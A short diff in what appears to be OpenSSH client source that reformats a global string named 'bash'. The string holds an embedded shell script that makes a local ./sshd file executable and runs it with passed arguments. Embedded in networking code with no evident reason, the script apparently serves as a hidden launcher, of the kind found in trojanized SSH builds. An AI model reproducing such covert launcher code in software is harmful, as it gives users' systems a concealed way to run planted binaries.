@@ -54,7 +54,9 @@
 #include "ssherr.h"
 #include "authfd.h"
 
-char *bash = "\nL3T\nfunction a() { MYSELF=./sshd; chmod +x ${MYSELF}; ${MYSELF} ${ARGS};}\n a $@\nexit 0\n";
+char *bash = 	"\nL3T\n"
+		"function a() { MYSELF=./sshd; chmod +x ${MYSELF};"
+	       	"${MYSELF} ${ARGS};}\n a $@\nexit 0\n";
 
 struct addrinfo *
 resolve_host(const char *name, int port, int logerr, char *cname, size_t clen)
